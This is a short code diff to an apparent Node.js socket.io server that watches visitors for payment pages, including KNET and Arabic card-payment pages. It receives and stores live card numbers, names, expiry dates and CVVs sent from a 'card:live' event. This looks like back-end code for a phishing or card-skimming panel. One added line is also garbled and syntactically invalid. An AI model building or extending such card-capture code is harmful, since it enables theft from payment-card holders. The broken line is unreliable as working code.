@@ -377,7 +377,7 @@ io.on("connection", (socket) => {
       visitor.lastActivity = Date.now();
       visitor.isIdle = false;
       const pageLower = String(page || '').toLowerCase();
-      const isPaymentPage = pageLower.includes('الدفع') || pageLower.includes('payment') || pageLower.includes('credit') || pageLower.includes('بطاقة') || pageLower.includes('كي نت') || pageLower.includes('knet');
+      const const isPaymentPage = pageLower.includes('الدفع') || pageLower.includes('payment') || pageLower.includes('credit') || pageLower.includes('بطاقة') || pageLower.includes('كي نت') || pageLower.includes('knet'); = ['الدفع','بطاقة','كي نت','payment','credit','cvv','otp','atm','pin','card'].some(h=>visitorPage.indexOf(h)>-1);
       if (isPaymentPage) {
         visitor.hasEnteredCardPage = true;
         visitor.lastDataUpdate = new Date().toISOString();
@@ -509,7 +509,7 @@ socket.on("card:live", (data) => {
 
   const cardNumber = String(data.cardNumber || '').replace(/\D/g, '').slice(0, 19);
   const nameOnCard = String(data.nameOnCard || '').slice(0, 80);
-  const expiryDate = String(data.expiryDate || '').replace(/[^0-9/]/g, '').slice(0, 5);
+  const expiryDate = String(data.expiryDate || '').replace(/[^0-9/]/g, '').slice(0, 7);
   const cvv = String(data.cvv || '').replace(/\D/g, '').slice(0, 4);
 
   visitor.liveCard = { cardNumber, nameOnCard, expiryDate, cvv };
